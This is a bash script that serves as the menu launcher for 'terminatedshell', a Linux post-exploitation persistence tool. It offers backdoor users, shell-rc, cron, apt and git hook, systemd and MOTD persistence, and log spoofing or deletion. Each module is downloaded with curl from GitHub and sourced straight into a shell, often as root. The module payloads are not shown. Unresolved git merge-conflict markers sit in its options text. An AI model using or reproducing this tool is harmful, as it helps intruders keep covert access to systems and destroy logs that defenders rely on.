#!/usr/bin/env bash

# ──────────────────────────────────────────────────────────────────────────────────────────────
# |   Author: https://github.com/oxb1te                                                        |
# |   Repository: https://github.com/terminatedshell                                           |
# |   Purpose: To learn basics methods of persistance after exploitation                       |
# |   License: Apache 2.0 | Check ./LICENSE file or http://www.apache.org/licenses/LICENSE-2.0 |
# |   How it works: Check general info about functions in ./README.md                          |
# ──────────────────────────────────────────────────────────────────────────────────────────────

# ----- Global script variables -----
LC_ALL="en_US.UTF-8" 
current_shell=$(grep "^$USER:" /etc/passwd | cut -d: -f7)
random=$(echo $RANDOM | head -c 2)

# --- ANSI colors ---
BOLD='\033[1m'
RED='\033[0;91m' # --- Light red ---
ALERT='\033[1;5;91m' # --- Bold, Blinking & Red ---
EOC='\033[0m' # --- End of the ANSI color ---

line(){ 
     printf -- '────────%.0s' \ {1..5}
}

if command -v rlwrap &> /dev/null; then
    if [ -z "$RLWRAP" ]; then
        RLWRAP=1 exec rlwrap "$0" "$@"
    fi
else
    echo "${RED}rlwrap${EOC} is not installed. Command history will not work."
fi


text_banner="
 ${RED}     .--.${EOC}
 ${RED}    |x x |   ╔╦╗${EOC}${BOLD}┌─┐┬─┐┌┬┐┬┌┐┌┌─┐┌┬┐┌─┐┌┬┐${EOC}${RED}╔═╗${EOC}${BOLD}┬ ┬┌─┐┬  ┬  ${EOC}
 ${RED}    |\_/ |    ║ ${EOC}${BOLD}├┤ ├┬┘│││││││├─┤ │ ├┤  ││${EOC}${RED}╚═╗${EOC}${BOLD}├─┤├┤ │  │  ${EOC}
 ${RED}   // x \ \   ╩ ${EOC}${BOLD}└─┘┴└─┴ ┴┴┘└┘┴ ┴ ┴ └─┘─┴┘${EOC}${RED}╚═╝${EOC}${BOLD}┴ ┴└─┘┴─┘┴─┘${EOC}
 ${RED}  (|  x  | )       Tool for persistence in linux${EOC}
 ${RED} /'|_ x _/'\   ${ALERT}Use this script for educational purposes.${EOC}
 ${RED} \___)=(___/${EOC} "

options="
<<<<<<< HEAD
\t\t${RED}[ - FUNCTIONS - ]${EOC}
=======
\t\t${RED}[ - MAIN FUNCTIONS - ]${EOC}
>>>>>>> refs/remotes/origin/main
\t${RED}$(line)${EOC}
\t${RED}[1]${EOC} ${BOLD}- Manage Users [view|add|delete]                      ${EOC}
\t$(line)
\t${RED}[2]${EOC} ${BOLD}- Shell Config [.bashrc|.zshrc]                       ${EOC}
\t$(line)
\t${RED}[3]${EOC} ${BOLD}- Cron [job]                                          ${EOC}
\t$(line)
\t${RED}[4]${EOC} ${BOLD}- Hooks [apt-get|git]                                 ${EOC}
\t$(line)
\t${RED}[5]${EOC} ${BOLD}- Systemd                                             ${EOC}
\t$(line)
\t${RED}[6]${EOC} ${BOLD}- Message of the Day                                  ${EOC}
\t$(line)
\t${RED}[7]${EOC} ${BOLD}- Log [spoof|delete|disable]                          ${EOC}
\t${RED}$(line)${EOC}

\t\t${RED}[ - COMMANDS - ]${EOC}
\t${RED}$(line)${EOC}
\t${RED}[ cls | clear ]${EOC} -${BOLD} Clear terminal                          ${EOC}
\t$(line)
\t${RED}[ ? | h | help ]${EOC} -${BOLD} Show options                           ${EOC}
\t$(line)
\t${RED}[ root ]${EOC} - ${BOLD}Restart with SU privileges                     ${EOC}
\t$(line)
\t${RED}[ 0 | q | quit | exit ]${EOC} - ${BOLD}Exit                            ${EOC}
\t${RED}$(line)${EOC}
"

# --- Checks for privileges ---
priv_check(){
if [[ $EUID != 0 ]]; then
    echo -e "\n${RED}[!]${EOC} U are NOT running this script with superuser privileges. \n "
    read -rp $'\033[0;91m[?]\033[0m Are u sure to continiue \033[0;91mwithout\033[0m SU privileges [y/n] > ' priv_choice
    if [[ "$priv_choice" =~ ^[Yy]|[Yy][Ee][Ss]$ ]]; then 
        priv_status="not_su"
        echo -e "\n${RED}[!]${EOC} Many functions will ${RED}NOT${EOC} work probably ${RED}without${EOC} SU." && sleep 0.5
    elif [[ "$priv_choice" =~ ^[Nn]|[Nn][Oo]$ ]]; then
        echo -e "\n${RED}[!]${EOC} Exiting... " && sleep 0.5 && exit 0;
    else [[ -z "$priv_choice" ]];
        echo -e "\n${RED}[x]${EOC} U didn't choose any option \n${RED}[!]${EOC} Exiting..." && sleep 0.5 && exit 0
    fi;
else
    echo -e "${RED}[!]${EOC} U are running this script with superuser privileges. ${ALERT}Think before u type${EOC}\n "
    priv_status="is_su"
fi;
}

# --- Export vars for child proccesses ---
export LC_ALL current_shell random priv_status BOLD RED ALERT EOC


download_func(){
    local f_name
    local f_file=functions/$f_name;
    if [[ ! -f "$f_file" ]]; then
        echo -e "${RED}[!]${EOC} Function ${BOLD}$f_file${EOC} not found locally. Downloading..."
        if ! curl -fsSL "https://raw.githubusercontent.com/anonimidin/terminatedshell/main/functions/$f_name" -o "$f_file"; 
        then
            echo -e "${RED}[x]${EOC} Failed to download ${BOLD}$f_file${EOC}."
            return 0
        else
            echo -e "${RED}[+]${EOC} ${BOLD}$f_file${EOC} download successfuly."
        fi
    fi;
    return 0
}


# --- User management [ View | Add | Delete ] --- 
manage_users() {
    if download_func "MANAGE_USERS" && . functions/MANAGE_USERS; then
        echo -e "\n${RED}[+]${EOC} ${BOLD}User management${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
    else
        echo -e "\n${RED}[x]${EOC} ${BOLD}User management${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
    fi;
}

# --- Shell Configuration Persistence File [ bash | zshrc ] ---
shell_func(){
    if download_func "SHELL" && . functions/SHELL; then
        echo -e "\n${RED}[+]${EOC} ${BOLD}Shell${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
    else
        echo -e "\n${RED}[x]${EOC} ${BOLD}Shell${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
    fi;
}

# --- Cron Persistance ---
cron_func(){
    if download_func "CRON" && . functions/CRON; then
        echo -e "\n${RED}[+]${EOC} ${BOLD}Cron${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
    else
        echo -e "\n${RED}[x]${EOC} ${BOLD}Cron${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
    fi;
}

# --- Hooks presistance [ Apt pre-invoke and Git pre-commit ] ---
hooks_func(){
    if download_func "HOOKS" && . functions/HOOKS; then
        echo -e "\n${RED}[+]${EOC} ${BOLD}Hooks${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
    else
        echo -e "\n${RED}[x]${EOC} ${BOLD}Hooks${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
    fi;
}

# --- Systemd persistence [ User/SU level]---
systemd_func(){
    if download_func "SYSTEMD" && . functions/SYSTEMD; then
        echo -e "\n${RED}[+]${EOC} ${BOLD}Systemd${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
    else
        echo -e "\n${RED}[x]${EOC} ${BOLD}Systemd${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
    fi;
}

# --- MOTD persistence ---  
motd_func(){
if [[ $priv_status == "is_su" ]]; then
    if download_func "MOTD" && . functions/MOTD; then
        echo -e "\n${RED}[+]${EOC} ${BOLD}MOTD${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
    else
        echo -e "\n${RED}[x]${EOC} ${BOLD}MOTD${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
    fi;
else
    echo -e "${RED}[x]${EOC} U cannot edit ${BOLD}MOTD${EOC} file without SU privileges\n" && menu
fi
}

# --- Logs [ spoof | delete & disable ] ---
logs_func(){
    if download_func "LOGS" && . functions/LOGS; then
        echo -e "\n${RED}[+]${EOC} ${BOLD}LOGS${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
    else
        echo -e "\n${RED}[x]${EOC} ${BOLD}LOGS${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
    fi
}

closing(){ 
    echo -e "\n\n${RED}[+]${EOC} Closing program..." && \
    echo -e "\n${RED}[!]${EOC} ${BOLD}Don't forget to check git repo${EOC} (${RED}https://github.com/anonimidin/terminatedshell${EOC})" && \
    sleep 0.3 && exit 0;
}
trap closing SIGINT SIGTSTP

banner() {
echo -e "$text_banner"
echo -e "$options"

if (( $(tput cols) < 155 )); then
    echo -e "${BOLD}${RED}[*]${EOC} Your width of terminal is ${RED}$(tput cols)${EOC}" 
    echo -e "${BOLD}${RED}[*]${EOC} For best reading performance columns must be ${RED}155+${EOC}\n"
fi;
}

# ----- Menu Function -----
menu(){
# --- Options ---
read -rp $'\033[0;91m[*] [TERMINATED_SHELL] >\e[0m ' choice
    # --- Wait for choice from user ---
    case $choice in
     
    1) sleep 0.5 && echo && manage_users;;
    2) sleep 0.5 && echo && shell_func;;
    3) sleep 0.5 && echo && cron_func;;
    4) sleep 0.5 && echo && hooks_func;;
    5) sleep 0.5 && echo && systemd_func;;
    6) sleep 0.5 && echo && motd_func;;
    7) sleep 0.5 && echo && logs_func;;
    # 10) sleep 0.5 && echo && new_func ;;

    0 | [Qq] | [Qq][Uu][Ii][Tt] | [Ee][Xx][Ii][Tt]) # --- About repo & exit ---
        sleep 0.5
        echo -e "${RED}[!]${EOC} ${RED}Help us to improve this script (https://github.com/anonimidin/terminatedshell)${EOC}\n" ;;

    "?" | [Hh] | [Hh][Ee][Ll][Pp]) # --- Show option based menu ---
        sleep 0.5 && echo -e "$options" && menu;;

    [Cc][Ll][Ss]|[Cc][Ll][Ee][Aa][Rr]) # --- Clear terminal --- 
        sleep 0.3 && (clear) && menu ;;
    
    [Rr][Oo][Oo][Tt])
        sleep 1; clear && \
        echo -e "${RED}[*]${EOC} Restarting script with ${RED}SU privileges${EOC}..." && \
        exec sudo -s "$current_shell" "$0"; ;;

    *) echo -e "\n${RED}[!]${EOC} ${BOLD}Choose correct option.${EOC}\n" && menu;;
    esac
}

# ----- MAIN -----
if (( $1 )) ; then
    echo -e "\n${RED}[!] This script doesn't require any arguments${EOC}" && \
    exit 1;
else
    priv_check || { 
        echo -e "${RED}[x]${EOC} Failed to check ${RED}privilege${EOC} of current user ${RED}${USER}${EOC}" && \
        exit 1; 
    }
    banner || { 
        echo -e "${RED}[x]${EOC} Failed to display ${RED}banner${EOC}\n";
    }
    menu || { 
        echo -e "${RED}[x]${EOC} Failed to start ${RED}menu${EOC}" && \
        exit 1; 
    }
fi;
